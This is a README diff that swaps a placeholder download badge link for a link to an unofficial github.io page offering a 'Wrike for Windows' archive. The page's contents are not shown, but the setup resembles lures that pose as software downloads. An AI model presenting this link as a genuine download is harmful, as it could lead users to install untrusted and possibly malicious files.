@@ -6,7 +6,7 @@ Wrike for Windows delivers a powerful platform for project management, task orga
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://wrike-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
